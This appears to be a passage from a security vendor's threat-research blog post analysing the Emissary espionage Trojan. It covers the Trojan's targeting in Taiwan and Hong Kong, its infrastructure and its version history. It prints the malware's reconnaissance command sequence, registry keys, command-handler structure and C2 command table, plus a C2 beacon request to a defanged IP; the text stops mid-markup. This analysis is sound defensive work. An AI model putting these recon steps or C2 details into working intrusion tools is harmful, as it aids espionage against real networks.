<p>We also found several different versions of Emissary that had several iterative changes that show how the Trojan evolved over the years. One of the most interesting observations made during this analysis is that the amount of development effort devoted to Emissary significantly increased after we published our <a href="https://blog.paloaltonetworks.com/2015/06/operation-lotus-blossom/" target="_blank">Operation Lotus Blossom</a> report in June 2015, resulting in many new versions of the Emissary Trojan. In addition, we observed a TTP shift post publication with regards to their malware delivery; they started using compromised but legitimate domains to serve their malware. Interestingly, the C2 infrastructure is also somewhat different than that used by Elise.</p>
<h2>Targeting</h2>
<p>In contrast to Elise, which was used in attacks against multiple Southeast Asian countries in region appropriate languages, all of the Emissary decoys we’ve collected are written in Traditional Chinese, which is used primarily in Taiwan and Hong Kong. The targets we have identified are also limited to those two regions. Despite appearing to target a more limited geographical range, Emissary targeted the government, higher education, and high tech companies with a mix of copy and pasted news articles and documents that do not appear to be available online. Decoys include:</p>
<ul>
<li>An Excel spreadsheet containing legitimate contact information for much of the Taiwanese government that does not appear to be available online.</li>
<li>Copy and paste of a news article where the Deputy Commander of the Nanjing Military region, Wang Huanguang, responds negatively to a 2014 magazine article from a respected US Taiwan scholar saying the odds of China and Taiwan reuniting is low and discussing the issues with an attempted military takeover.</li>
<li>Copy of a news article from 2010 about the Chinese League of Victims protesting the involuntary removal of Shanghai residents in the lead up to the Shanghai Expo.</li>
<li>Copy of the official Taiwan holiday schedule for 2016, which is the 105<sup>th</sup> anniversary of the current Taiwanese government.</li>
</ul>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/02/Emissary-1-1.jpg" rel="wpdevart_lightbox"><img decoding="async" class=" size-full wp-image-12039 aligncenter" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/02/Emissary-1-1.jpg" alt="Emissary 1" width="432" height="399" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/02/Emissary-1-1.jpg 432w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/02/Emissary-1-1-300x277.jpg 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/02/Emissary-1-1-370x342.jpg 370w" sizes="(max-width: 432px) 100vw, 432px" /></a></p>
<p style="text-align: center;">Figure 1: Partial screenshot of the response from Deputy Commander of the Nanjing Military Region Wang Huangguang.</p>
<h2>Evolve to Survive: TTP Shifts and Infrastructure</h2>
<p>We’ve expanded our knowledge of Emissary infrastructure significantly since our first Emissary blog and we’ve found almost exclusive use of Dynamic DNS (DDNS) domains with only one purchased from a Chinese reseller. In contrast, the Elise samples used a mix of actor-registered and DDNS, with the actor-registered serving as one of the data points we used to tie all of the activity together. While the use of DDNS can make tying activity together more difficult, and despite the new Emissary variants since our publication, two of the most recent C2s resolved to IPs used by Elise C2s detailed in Operation Lotus Blossom. The Emissary samples typically have three hardcoded C2s that are a mix of IPs and domain names, with one of the domains or IPs not being used by the other three C2s in a likely effort to avoid loss of control. A full IOC list is included at the end of this report.</p>
<p>Also new is the actors’ use of compromised legitimate Taiwanese websites to serve their malware, including the official website of the Democratic Progressive Party. This is particularly interesting as Taiwan just held a closely watched Presidential election on 16 January where DPP candidate Tsai Ing-wen won. This marked the first time a woman was elected President of Taiwan and only the second time a member of the Kuomintang did not hold the office since being ousted from China in 1949 when the Communist Party of China took power. In line with her party’s stance, she is widely seen as a proponent of an independent Taiwan and not in favor of reunification with the People’s Republic of China.</p>
<h2>Malware Updates</h2>
<p>Our evidence suggests that malware authors created Emissary as early as 2009, which suggests that threat actors have relied on this tool as a payload in cyber-espionage attacks for many years. The Emissary Trojan is a capable tool to gain a foothold on a targeted system. While it lacks more advanced functionality like screen capturing, it is still able to carry out most tasks desired by threat actors: exfiltration of files, ability to download and execute additional payloads, and gain remote shell access. It appears that threat actors have continually used this Trojan, and developed several updated versions of Emissary to remain undetected and fresh over time.</p>
<p>We analyzed all of the known Emissary samples to determine what changes the malware author made between the different versions of the Trojan. During our analysis, we examined when each sample was created based on its compile time and produced a simple timeline, seen in Figure 2, to display the development efforts expended on the Emissary Trojan. It should be noted that we know some Emissary samples have been used multiple times with different configurations, so the timeline only shows when development activity took place on Emissary and should not be misconstrued to when Emissary was used in attacks.</p>
<p>The timeline in Figure 2 shows that the Emissary Trojan was first created (version 1.0) in May 2009 and quickly received an update that resulted in version 1.1 in June 2009. The Trojan did not receive much in the form of updates until September 2011 when the author released version 2.0. Version 2.0 received one update in October 2013 before the malware author released version 3.0 in December 2014. The malware author released version 4.0 in March 2015, but curiously created a version 3.0 sample afterwards on June 26, 2015, which was out-of-sequence from the incrementing versioning. Between August and November 2015 the malware author creates several new versions of Emissary, specifically 5.0, 5.1, 5.3 and 5.4 in a much more rapid succession compared to development process in earlier versions.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/02/emissary_compilation_timeline_with_olb_vertical1.png" rel="wpdevart_lightbox"><img decoding="async" class="aligncenter size-large wp-image-12045" src="http://blog.paloaltonetworks.com/wp-content/uploads/2016/02/emissary_compilation_timeline_with_olb_vertical1-500x2128.png" alt="emissary_compilation_timeline_with_olb_vertical" width="500" height="2128" /></a></p>
<p style="text-align: center;">Figure 2: Timeline of development efforts spent on Emissary</p>
<p>The out-of-sequence version 3.0 appears to be an early variant of version 5.0 based on significant similarities (discussed in the changelog section) that are not seen in the original version 3.0 and other earlier versions of Emissary. One campaign code associated with of the out-of-sequence version 3.0 sample was “3test”, suggesting the malware author created it for testing purposes. The other campaign code associated with the out-of-sequence sample was “IC00001”, which could denote an attack payload as it appears to be a plausible code to describe a campaign.</p>
<p>While this may be coincidental, the out-of-sequence version 3.0 sample was created ten days after we published the <a href="https://blog.paloaltonetworks.com/2015/06/operation-lotus-blossom/">Operation Lotus Blossom</a> paper that exposed the Elise Trojan that is closely related to Emissary. It is possible that the threat actors were prompted to make malware changes in response to our research. Regardless of causation, the rapid development of new versions of Emissary suggests that the malware authors are making frequent modifications to evade detection, which as a corollary suggests the threat actors are actively using the Emissary Trojan as a payload in attacks.</p>
<h2>Emissary Changelog</h2>
<p>In this section, we discuss the changes observed between each version of Emissary. As this section is focused on changes, the features and functionality are the same between Emissary versions unless otherwise mentioned.</p>
<h4>Version 1.0</h4>
<p><strong>Date: 5/12/2009</strong></p>
<p>SHA256: a7d07b92e48876e2195e5d8769a47cf0a237e11ac304e41b14fc36042b0d9484 Original Name: WUMsvc.dll</p>
<p><strong>Initial Release</strong></p>
<p>The initial loader Trojan writes Emissary to %SYSTEM%\WSPsvc.dll and installs it as a service, which will run the exported function "ServiceMain" within the Emissary Trojan to carry out its functionality.</p>
<p>Configuration data is stored in the last 1024 bytes of the payload, from which the Trojan will extract an 896 byte structure. The configuration is decrypted with an algorithm that uses the XOR operation on each byte using the value at a different offset within the ciphertext.</p>
<p>The code will create the following registry keys:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-671986a833e18523780734" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
HKEY_CLASSES_ROOT\Shell.LocalServer\CheckCode
HKEY_CLASSES_ROOT\Shell.LocalServer\CheckID</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-671986a833e18523780734-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e18523780734-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-671986a833e18523780734-1"><span class="crayon-i">HKEY_CLASSES_ROOT</span><span class="crayon-sy">\</span><span class="crayon-i">Shell</span><span class="crayon-sy">.</span><span class="crayon-i">LocalServer</span><span class="crayon-sy">\</span><span class="crayon-e">CheckCode</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e18523780734-2"><span class="crayon-i">HKEY_CLASSES_ROOT</span><span class="crayon-sy">\</span><span class="crayon-i">Shell</span><span class="crayon-sy">.</span><span class="crayon-i">LocalServer</span><span class="crayon-sy">\</span><span class="crayon-i">CheckID</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>Emissary uses the "CheckCode" registry key to store the encrypted configuration for the Trojan, while it stores a GUID that Emissary uses to uniquely identify the compromised host in the "CheckID" key.</p>
<p>The malware performs initial system information gathering and saves data to a file named TMP2548. The initial gathering relies on a combination of the following commands executed by the command prompt:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-671986a833e1e600420545" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
commands executed by the command prompt:

ECHO VER
VER
ECHO IPCONFIG /ALL
IPCONFIG /ALL
ECHO NET LOCALGROUP ADMINISTRATORS
NET LOCALGROUP ADMINISTRATORS
ECHO NET START
NET START
ECHO GPRESULT /Z
GPRESULT /Z
ECHO GPRESULT                  /SCOPE COMPUTER /Z
GPRESULT                     /SCOPE COMPUTER /Z
ECHO SYSTEMINFO
SYSTEMINFO</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-671986a833e1e600420545-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e1e600420545-2">2</div><div class="crayon-num" data-line="crayon-671986a833e1e600420545-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e1e600420545-4">4</div><div class="crayon-num" data-line="crayon-671986a833e1e600420545-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e1e600420545-6">6</div><div class="crayon-num" data-line="crayon-671986a833e1e600420545-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e1e600420545-8">8</div><div class="crayon-num" data-line="crayon-671986a833e1e600420545-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e1e600420545-10">10</div><div class="crayon-num" data-line="crayon-671986a833e1e600420545-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e1e600420545-12">12</div><div class="crayon-num" data-line="crayon-671986a833e1e600420545-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e1e600420545-14">14</div><div class="crayon-num" data-line="crayon-671986a833e1e600420545-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e1e600420545-16">16</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-671986a833e1e600420545-1"><span class="crayon-e">commands </span><span class="crayon-e">executed </span><span class="crayon-e">by </span><span class="crayon-e">the </span><span class="crayon-e">command </span><span class="crayon-i">prompt</span><span class="crayon-sy">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e1e600420545-2">&nbsp;</div><div class="crayon-line" id="crayon-671986a833e1e600420545-3"><span class="crayon-e">ECHO </span><span class="crayon-e">VER</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e1e600420545-4"><span class="crayon-e">VER</span></div><div class="crayon-line" id="crayon-671986a833e1e600420545-5"><span class="crayon-e">ECHO </span><span class="crayon-i">IPCONFIG</span><span class="crayon-h"> </span>/<span class="crayon-e">ALL</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e1e600420545-6"><span class="crayon-i">IPCONFIG</span><span class="crayon-h"> </span>/<span class="crayon-e">ALL</span></div><div class="crayon-line" id="crayon-671986a833e1e600420545-7"><span class="crayon-e">ECHO </span><span class="crayon-e">NET </span><span class="crayon-e">LOCALGROUP </span><span class="crayon-e">ADMINISTRATORS</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e1e600420545-8"><span class="crayon-e">NET </span><span class="crayon-e">LOCALGROUP </span><span class="crayon-e">ADMINISTRATORS</span></div><div class="crayon-line" id="crayon-671986a833e1e600420545-9"><span class="crayon-e">ECHO </span><span class="crayon-e">NET </span><span class="crayon-e">START</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e1e600420545-10"><span class="crayon-e">NET </span><span class="crayon-e">START</span></div><div class="crayon-line" id="crayon-671986a833e1e600420545-11"><span class="crayon-e">ECHO </span><span class="crayon-i">GPRESULT</span><span class="crayon-h"> </span>/<span class="crayon-i">Z</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e1e600420545-12"><span class="crayon-i">GPRESULT</span><span class="crayon-h"> </span>/<span class="crayon-i">Z</span></div><div class="crayon-line" id="crayon-671986a833e1e600420545-13"><span class="crayon-e">ECHO </span><span class="crayon-i">GPRESULT</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>/<span class="crayon-e">SCOPE </span><span class="crayon-i">COMPUTER</span><span class="crayon-h"> </span>/<span class="crayon-i">Z</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e1e600420545-14"><span class="crayon-i">GPRESULT</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>/<span class="crayon-e">SCOPE </span><span class="crayon-i">COMPUTER</span><span class="crayon-h"> </span>/<span class="crayon-i">Z</span></div><div class="crayon-line" id="crayon-671986a833e1e600420545-15"><span class="crayon-e">ECHO </span><span class="crayon-e">SYSTEMINFO</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e1e600420545-16"><span class="crayon-i">SYSTEMINFO</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>Emissary parses command and control responses for "instru", which will precede a GUID value that designates the command the C2 server wishes to execute on the system. The command handler does not use a nested if/else or switch statement like most malware families, instead Emissary creates a structure that contains all of the available command GUIDs that it will iterate through each time the C2 supplies a GUID in order to determine which command the operator wishes to execute. Emissary can include up to 32 different commands within this data structure, but it appears the author has decided to include six commands within the Trojan. The following denotes the command handler structure used by Emissary v1.0:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-671986a833e20963030848" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
struct EMISSARY_COMMAND
{
  CHAR guid[40];
  DWORD sub_function;
  DWORD arg1_subfunction;
  DWORD arg2_subfunction;
  DWORD arg3_subfunction;
};

struct commandHandler 
{
  DWORD number_of_commands;
  DWORD unused;
  struct EMISSARY_COMMAND cmd_0;
  struct EMISSARY_COMMAND cmd_1;
  struct EMISSARY_COMMAND cmd_2;
  struct EMISSARY_COMMAND cmd_3;
  struct EMISSARY_COMMAND cmd_4;
  struct EMISSARY_COMMAND cmd_5;
};</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-671986a833e20963030848-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e20963030848-2">2</div><div class="crayon-num" data-line="crayon-671986a833e20963030848-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e20963030848-4">4</div><div class="crayon-num" data-line="crayon-671986a833e20963030848-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e20963030848-6">6</div><div class="crayon-num" data-line="crayon-671986a833e20963030848-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e20963030848-8">8</div><div class="crayon-num" data-line="crayon-671986a833e20963030848-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e20963030848-10">10</div><div class="crayon-num" data-line="crayon-671986a833e20963030848-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e20963030848-12">12</div><div class="crayon-num" data-line="crayon-671986a833e20963030848-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e20963030848-14">14</div><div class="crayon-num" data-line="crayon-671986a833e20963030848-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e20963030848-16">16</div><div class="crayon-num" data-line="crayon-671986a833e20963030848-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e20963030848-18">18</div><div class="crayon-num" data-line="crayon-671986a833e20963030848-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e20963030848-20">20</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-671986a833e20963030848-1"><span class="crayon-t">struct</span><span class="crayon-h"> </span><span class="crayon-e">EMISSARY_COMMAND</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e20963030848-2"><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-671986a833e20963030848-3"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-t">CHAR</span><span class="crayon-h"> </span><span class="crayon-i">guid</span><span class="crayon-sy">[</span><span class="crayon-cn">40</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e20963030848-4"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-e">DWORD </span><span class="crayon-i">sub_function</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-671986a833e20963030848-5"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-e">DWORD </span><span class="crayon-i">arg1_subfunction</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e20963030848-6"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-e">DWORD </span><span class="crayon-i">arg2_subfunction</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-671986a833e20963030848-7"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-e">DWORD </span><span class="crayon-i">arg3_subfunction</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e20963030848-8"><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-671986a833e20963030848-9">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e20963030848-10"><span class="crayon-t">struct</span><span class="crayon-h"> </span><span class="crayon-e">commandHandler</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-671986a833e20963030848-11"><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e20963030848-12"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-e">DWORD </span><span class="crayon-i">number_of_commands</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-671986a833e20963030848-13"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-e">DWORD </span><span class="crayon-i">unused</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e20963030848-14"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-t">struct</span><span class="crayon-h"> </span><span class="crayon-e">EMISSARY_COMMAND </span><span class="crayon-i">cmd_0</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-671986a833e20963030848-15"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-t">struct</span><span class="crayon-h"> </span><span class="crayon-e">EMISSARY_COMMAND </span><span class="crayon-i">cmd_1</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e20963030848-16"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-t">struct</span><span class="crayon-h"> </span><span class="crayon-e">EMISSARY_COMMAND </span><span class="crayon-i">cmd_2</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-671986a833e20963030848-17"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-t">struct</span><span class="crayon-h"> </span><span class="crayon-e">EMISSARY_COMMAND </span><span class="crayon-i">cmd_3</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e20963030848-18"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-t">struct</span><span class="crayon-h"> </span><span class="crayon-e">EMISSARY_COMMAND </span><span class="crayon-i">cmd_4</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-671986a833e20963030848-19"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-t">struct</span><span class="crayon-h"> </span><span class="crayon-e">EMISSARY_COMMAND </span><span class="crayon-i">cmd_5</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e20963030848-20"><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p></p>
<p style="text-align: left;">Table 1 contains the commands available within the Emissary v1.0 command handler.</p>
<table style="height: 600px;" width="500">
<tbody>
<tr>
<td width="136"><strong>Command</strong></td>
<td width="189"><strong>Description</strong></td>
</tr>
<tr>
<td width="136">bac84b12-5b0b-491f-a885-8667d156394f</td>
<td width="189">Upload file.</td>
</tr>
<tr>
<td width="136">3d8313cc-53ca-4751-bbbf-ea5f914f8e65</td>
<td width="189">Download file.</td>
</tr>
<tr>
<td width="136">db0e93e7-b46c-4cba-81f1-ec70da57dc19</td>
<td width="189">Update config. C2 specifies files as: p1 = C2 server 1, p2 = C2 server 2, p3 = C2 server 3, p4 = Sleep Interval, p5 = System Identifier (computer name), p6 = GUID for beacon.</td>
</tr>
<tr>
<td width="136">2e382e51-3089-4293-8454-5eccb253eb54</td>
<td width="189">Executes a specified command.</td>
</tr>
<tr>
<td width="136">a57db08a-bf97-4b43-b27d-157e62e2fd74</td>
<td width="189">Create remote shell.</td>
</tr>
<tr>
<td width="136">eab5c1ab-a497-4fc2-bbe0-049be45d6f2d</td>
<td width="189">Update Trojan with new executable.</td>
</tr>
</tbody>
</table>
<p style="text-align: center;">Table 1: Emissary command handler</p>
<p>The Emissary version 1.0 beacon to the C2 server appears as follows:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-671986a833e21119425705" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /VSNET/default.aspx HTTP/1.1
User-Agent: Mozilla/4.0
Host: 193.34.144[.]21
Cookie: guid=af44f802-ba5c-4b3c-8c6b-2ea411058678; op=1635b097-ffe4-4711-89e6-7f8c7f4cdca6</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-671986a833e21119425705-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e21119425705-2">2</div><div class="crayon-num" data-line="crayon-671986a833e21119425705-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e21119425705-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-671986a833e21119425705-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span>/<span class="crayon-i">VSNET</span>/<span class="crayon-st">default</span><span class="crayon-sy">.</span><span class="crayon-e">aspx </span><span class="crayon-i">HTTP</span>/<span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e21119425705-2"><span class="crayon-i">User</span>-<span class="crayon-i">Agent</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span>/<span class="crayon-cn">4.0</span></div><div class="crayon-line" id="crayon-671986a833e21119425705-3"><span class="crayon-i">Host</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">193.34.144</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-cn">21</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e21119425705-4"><span class="crayon-i">Cookie</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">guid</span>=<span class="crayon-i">af44f802</span>-<span class="crayon-i">ba5c</span>-<span class="crayon-cn">4b3c</span>-<span class="crayon-cn">8c6b</span>-<span class="crayon-cn">2ea411058678</span><span class="crayon-sy">;</span><span 